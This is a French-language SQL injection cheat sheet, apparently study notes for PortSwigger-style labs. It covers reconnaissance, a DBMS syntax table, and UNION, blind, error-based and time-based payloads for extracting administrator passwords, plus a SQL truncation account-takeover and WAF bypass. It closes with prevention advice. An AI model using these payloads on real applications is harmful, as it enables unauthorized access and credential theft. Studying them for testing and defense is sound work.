# SQL Injection

## Les bases

Points de vigilance avant toute injection :

- **SGBDR** : la syntaxe change selon Oracle, MySQL, SQLite, PostgreSQL, Microsoft SQL Server.
- **Syntaxe** : attention aux caractères `--`, `'`, `||`, `~`.
- **Outils Burp** : Repeater et Intruder.
- **Scripting** : essentiel, plus fiable que l'Intruder de Burp.
- **CheatSheet** : https://portswigger.net/web-security/sql-injection/cheat-sheet

Payload de base (Oracle / Postgres / SQLite — `||` concatène ; sur MySQL c'est un OR logique) :

```text
' || ( INJECTION ) --
```

### Voler des données cachées

Injecter une condition toujours vraie pour renvoyer toutes les lignes.

```text
'--
' OR 1=1--
```

### Contourner la logique de l'application

Commenter la vérification du mot de passe pour se connecter sans lui.

```text
administrator'--
```

## Recon (avant d'injecter)

Trois questions à trancher **avant tout payload**. Les sauter = coller un payload au hasard sur le mauvais SGBD ou le mauvais contexte (cause de la plupart des échecs). On part du signal observable, pas d'un catalogue mémorisé.

**1. Contexte** — où atterrit l'entrée ? Détermine comment sortir de la requête.

```text
'        → erreur = string literal   WHERE x='INPUT'   (sortir avec ' puis --)
1+1 → 2  → numérique                 WHERE id=INPUT    (pas de quote)
,1 OK / UNION KO → identifiant       ORDER BY INPUT    (pas de UNION, injecter après ASC)
```

**2. SGBD** — quelle syntaxe utiliser ? Le plus souvent lu directement dans le message d'erreur :

```text
LINE n: ... ^              → PostgreSQL
...near '...' at line n    → MySQL / MariaDB
ORA-01234                  → Oracle
Incorrect syntax near      → MS SQL Server
```

Sinon, tester une fonction version : `version()` (MySQL/PG), `@@version` (MySQL/MSSQL), `sqlite_version()`, `SELECT banner FROM v$version` (Oracle).

**3. Quotes échappées ?** — l'appli double/échappe les `'` ?

```text
envoyer  ,'a'  → si l'erreur montre  ''a''  → littéraux interdits (addslashes/magic_quotes)
               → contourner : chr(97)||chr...  current_schema()  0x hex
```

## Table de correspondance SGBD

Identifier le SGBD (Recon étape 2), lire la colonne, adapter le payload. `(SQ)` = sous-requête scalaire.

| Opération        | MySQL                             | PostgreSQL           | Oracle                       | MS SQL Server        |
|------------------|-----------------------------------|----------------------|------------------------------|----------------------|
| concat           | `CONCAT(a,b)`                     | `a\|\|b`             | `a\|\|b`                     | `a+b`                |
| sous-chaîne      | `SUBSTRING(s,p,l)`                | `SUBSTR(s,p,l)`      | `SUBSTR(s,p,l)`              | `SUBSTRING(s,p,l)`   |
| longueur         | `LENGTH()`                       | `LENGTH()`           | `LENGTH()`                   | `LEN()`              |
| version          | `@@version`                      | `version()`          | `banner FROM v$version`      | `@@version`          |
| base courante    | `database()`                     | `current_database()` | `ora_database_name`          | `DB_NAME()`          |
| char sans quote  | `CHAR(65)` / `0x41`              | `chr(65)`            | `CHR(65)`                    | `CHAR(65)` / `0x41`  |
| lignes → 1 col   | `GROUP_CONCAT(c SEPARATOR ',')`  | `string_agg(c,',')`  | `LISTAGG(c,',')`             | `STRING_AGG` / `FOR XML PATH` |
| n-ième ligne     | `LIMIT n,1`                      | `LIMIT 1 OFFSET n`   | `OFFSET n ROWS FETCH NEXT 1` | `OFFSET n ROWS FETCH NEXT 1` |
| sleep            | `SLEEP(5)`                       | `pg_sleep(5)`        | `dbms_pipe.receive_message(('a'),5)` | `WAITFOR DELAY '0:0:5'` |
| error extract    | `extractvalue(1,concat(0x7e,(SQ)))` | `cast((SQ) as int)` | rare → passer en blind    | `cast((SQ) as int)`  |
| catalogue        | `information_schema.tables/.columns` | idem             | `all_tables/all_tab_columns` | `information_schema` idem |

Pièges :

- **Substring 1-indexé** dans les quatre SGBD (le 1er caractère est en position 1).
- **`--` MySQL exige un espace après** (`-- `), sinon `#` ou `/**/`.
- **`extractvalue`/`updatexml` MySQL tronquent à 32 car.** → paginer `SUBSTRING((SQ),1,32)` puis `,33,32`.
- **`cast as int` (PG/MSSQL)** : la valeur non numérique remonte dans `invalid input syntax for integer: "..."` — canal error-based sans troncature.

## SQL Truncation

Vuln de stockage, pas d'injection (zéro métacaractère). MySQL non-strict tronque `VARCHAR(n)` en silence, et `=` complète avec des espaces. On duplique un compte existant (`admin`) avec son propre mot de passe.

Repérer : `login VARCHAR(n)` court, form register + contrôle d'unicité.

Pour `VARCHAR(12)` + cible `admin` :

```text
login=admin%20%20%20%20%20%20%201&password=monpass
```

`admin` + 7 espaces + `1` = 13 car. → passe l'unicité → tronqué à 12 (`admin` + 7 espaces) → `= 'admin'` par padding. Le `1` force le dépassement et survit au trim. **Pas de quotes.** Puis login `admin` / `monpass`.

## UNION attacks

### Déterminer le nombre de colonnes

Incrémenter jusqu'à l'erreur, ou ajouter des `NULL` jusqu'à ce que la requête passe.

```text
' ORDER BY 1--
' UNION SELECT NULL,NULL,NULL--
```

### Trouver une colonne d'un type donné

Placer une chaîne à la position testée ; l'absence d'erreur confirme le type texte.

```text
' UNION SELECT NULL,'a',NULL--
```

### Extraire des données intéressantes

```text
' UNION SELECT username, password FROM users--
```

### Extraire plusieurs valeurs dans une seule colonne

Concaténer les champs avec un séparateur.

```text
' UNION SELECT username || '~' || password FROM users--
```

### Récupérer la version de la base

```text
' UNION SELECT @@version--
```

### Lister le contenu de la base

Lister les tables puis les colonnes via `information_schema`. `SELECT *` ne marche pas toujours : cibler `table_name` / `column_name`.

```text
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

## Blind SQL

### Exploiter une réponse conditionnelle

Le `trackingId` est utilisé dans une requête dont le résultat change l'affichage (message « Welcome back » présent ou absent). On s'en sert comme oracle booléen.

1. **Confirmer la vulnérabilité** — une condition vraie garde le message, une fausse le supprime.

```text
' AND 1=1--    → vrai → "Welcome back"
' AND 1=0--    → faux → pas de message
```

2. **Confirmer l'existence de la table `users`** :

```text
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

3. **Confirmer l'utilisateur `administrator`** :

```text
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

4. **Énumérer le mot de passe** — tester la longueur, puis extraire caractère par caractère (à automatiser avec l'Intruder).

```text
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>20)='administrator'--
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--
```

## Injection SQL basée sur une erreur

### Exploiter une réponse conditionnelle

Forcer une erreur (division par zéro) quand la condition est vraie ; pas d'erreur = condition fausse. `TO_CHAR`, `FROM dual`, `ROWNUM` ci-dessous sont **spécifiques Oracle**.

1. **Confirmer la vulnérabilité** :

```text
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'    → erreur
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'    → pas d'erreur
```

2. **Confirmer la table `users`** :

```text
'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```

3. **Confirmer l'utilisateur `administrator`** :

```text
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

4. **Longueur puis extraction du mot de passe** (Intruder sur `§position§` et `§caractère§`) :

```text
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

### Exploiter un message d'erreur verbeux

Prérequis : l'erreur SQL complète s'affiche dans la page. On force une erreur qui embarque la donnée. Payload selon SGBD (cf. table de correspondance).

Point d'injection selon contexte (Recon 1) : `,PAYLOAD` en ORDER BY, `'||PAYLOAD||'` en string literal.

```text
MySQL — extractvalue (tronque à 32 car.) :   ,extractvalue(1,concat(0x7e,(SQ)))
                     updatexml (idem)     :   ,updatexml(1,concat(0x7e,(SQ)),1)
PostgreSQL / MSSQL — cast (pas de troncature) :   ,cast((SQ) as int)
```

Séquence d'extraction (exemple PostgreSQL, contexte ORDER BY) :

```text
1. base      ,cast((SELECT current_database()) as int)
2. tables    ,cast((SELECT string_agg(table_name,',') FROM information_schema.tables
                    WHERE table_schema=current_schema()) as int)
3. colonnes  ,cast((SELECT string_agg(column_name,',') FROM information_schema.columns
                    WHERE table_name='T') as int)
4. dump      ,cast((SELECT string_agg(user||':'||pass,',') FROM T) as int)
```

Si quotes échappées (Recon 3), reconstruire sans littéral :

```text
'public' → current_schema()      ',' → chr(44)      ':' → chr(58)
'T'      → sous-requête (SELECT table_name FROM ... LIMIT 1 OFFSET n)
Table et colonnes dans FROM/SELECT = identifiants → écrits en clair, pas de quote.
```

### Exploiter avec les délais de réponse

Injecter un délai déclenché par la condition (temps de réponse = oracle). `pg_sleep` est spécifique à PostgreSQL. L'extraction se fait ensuite comme pour les réponses conditionnelles.

```text
'||pg_sleep(1)--
```

### Exploiter avec des techniques OAST (out-of-band)

Utiliser Burp Collaborator (Burp Suite Professional) pour recevoir une interaction réseau déclenchée par l'injection, quand aucune réponse n'est visible dans l'application.

### SQLi dans une requête XML — bypass de filtre (Hackvertor)

Le corps de la requête est du XML : injecter la SQLi dans un champ, puis encoder le payload avec l'extension Hackvertor (entités XML / hex) pour contourner la détection d'attaque (WAF). Le XML n'est que le transport, la vuln reste une SQLi.

```text
' UNION SELECT password FROM users WHERE username='administrator'--
```

## Prévention

### Requêtes paramétrées (prepared statements)

La structure SQL est compilée séparément des données ; la valeur fournie est toujours traitée comme littérale, jamais comme du code (`' OR 1=1--` reste une chaîne).

```python
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))
```

### Éléments non paramétrables (table, colonne, ORDER BY)

Les `?` ne couvrent pas les identifiants : valider l'entrée contre une liste blanche stricte.

```python
ALLOWED_SORT_COLUMNS = {"price": "product_price", "name": "product_name", "date": "created_at"}
sort_column = ALLOWED_SORT_COLUMNS.get(user_input, "created_at")  # défaut sûr si absent
query = f"SELECT * FROM products ORDER BY {sort_column} ASC"
```

### ORM

Un ORM génère des requêtes préparées par défaut ; le risque revient dès qu'on utilise `.raw()` ou une concaténation manuelle.

```python
session.query(User).filter(User.name == user_input).all()
```

### Moindre privilège

Le compte applicatif n'est jamais root/sa/postgres et n'a pas les droits DDL (`DROP`, `ALTER`, `CREATE`).

```sql
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'localhost';
```

### Masquage des erreurs et journalisation

Message générique côté front (bloque l'error-based), exception réelle loggée côté serveur pour la détection.

```text
Front   : "Une erreur est survenue"
Serveur : log complet de l'exception SQL
```